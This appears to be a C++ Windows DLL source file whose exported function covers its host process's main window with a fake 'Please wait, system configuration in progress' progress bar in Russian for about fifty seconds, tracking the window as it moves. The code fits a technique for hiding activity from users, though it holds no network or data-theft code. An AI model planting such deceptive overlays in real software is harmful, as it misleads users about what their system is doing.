// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "windows.h"
#include "commctrl.h"

#define EXPORT_API __declspec(dllexport) __stdcall

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{  
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	} 
	return TRUE; 
}
 
static DWORD WINAPI FakeWindow( LPVOID p )
{
	HWND parent = (HWND)p;
	HINSTANCE inst = (HINSTANCE)GetModuleHandleA(NULL);
	RECT r, r2;
	GetClientRect( parent, &r );
	POINT pp;
	pp.x = 0;
	pp.y = 0;
	ClientToScreen( parent, &pp );
	int xFW = pp.x, yFW = pp.y;
	int wFW = r.right, hFW = r.bottom;

	int wPB = r.right * 80 / 100;
	int hPB = 25;
	int xPB = (r.right - wPB) / 2;
	int yPB = (r.bottom - hPB) / 2;

	HWND fakeWindow = (HWND)CreateWindowExA( 0, "STATIC", "", WS_CHILD | WS_POPUP, xFW, yFW, wFW, hFW, parent, NULL, inst, NULL );

	if( !fakeWindow )
      return 0;  
 
	HWND warnWnd = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
	HWND warnText = (HWND)CreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
	HWND warnWnd2 = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
	HWND progressBar = (HWND)CreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );
	HFONT font = (HFONT)SendMessageA( parent, WM_GETFONT, 0, 0 );
	//if( font )
	//	SendMessageA( warnText, WM_SETFONT, (WPARAM)font, 1 );

	ShowWindow( fakeWindow, SW_SHOW );
	UpdateWindow(fakeWindow);
	//SetWindowPos( fakeWindow, parent, r.left + 100, r.top + 100, r.right, r.bottom, SWP_SHOWWINDOW );
	SetTimer( fakeWindow, 1, 500, 0 );

	SendMessageA( progressBar, PBM_SETRANGE, 0, MAKELPARAM( 0, 100 )); 
	SendMessageA( progressBar, PBM_SETSTEP, (WPARAM) 1, 0 );
	MSG msg;
	int remain = 100;
	GetWindowRect( parent, &r2 );
	r.left = r2.left;
	r.top = r2.top;
	r.right = r2.right;
	r.bottom = r2.bottom;

	while( GetMessage( &msg, 0, 0, 0 ) )
	{
		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow )
		{
			SendMessageA( progressBar, PBM_STEPIT, 0, 0 ); 
			if( --remain == 0 )
				break;
		}
	    TranslateMessage( &msg );
		DispatchMessage( &msg );
		GetWindowRect( parent, &r2 );
		if( r.left != r2.left || r.top != r2.top || r.right != r2.right || r.bottom != r2.bottom )
		{
			r.left = r2.left;
			r.top = r2.top;
			r.right = r2.right;
			r.bottom = r2.bottom;
			GetClientRect( parent, &r2 );
			pp.x = 0;
			pp.y = 0;
			ClientToScreen( parent, &pp );
			MoveWindow( fakeWindow, pp.x, pp.y, r2.right, r2.bottom, TRUE );
		}
	}

	return true;
}

static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	GetWindowThreadProcessId( wnd, &pid );
	if( pid == GetCurrentProcessId() )
	{
		*((HWND*)lParam) = wnd;
		return FALSE; //останавливаем поиск
	}
	return TRUE;
}

void EXPORT_API TestRun()
{
	HWND wnd = 0;
	EnumWindows( EnumTopWindows, (LPARAM)&wnd );
	if( wnd )
	{
		FakeWindow((LPVOID)wnd);
	}
	else
		OutputDebugString("not find window");
}
